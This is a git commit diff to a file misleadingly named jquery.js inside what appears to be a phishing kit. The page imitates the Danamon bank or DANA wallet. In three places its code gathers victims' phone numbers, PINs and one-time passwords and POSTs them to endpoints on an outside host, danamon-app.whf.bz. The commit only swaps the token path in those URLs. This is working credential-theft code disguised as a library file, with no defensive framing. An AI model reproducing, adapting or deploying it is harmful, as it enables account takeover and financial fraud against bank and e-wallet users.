7933f35aa590adb3d0ce955ba5aa953ea5e523f5
websiteappsd <developer_linkz@outlook.com>
2024-11-22 21:19:41 +0700

    Add files via upload

--- public/2/jquery.js
+++ public/2/jquery.js
@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana20/one.php',
+			  url: 'https://danamon-app.whf.bz/token/7119229342/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana20/two.php',
+			  url: 'https://danamon-app.whf.bz/token/7119229342/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana20/tree.php',
+			  url: 'https://danamon-app.whf.bz/token/7119229342/tree.php',
 			  data: dataString,
  
         
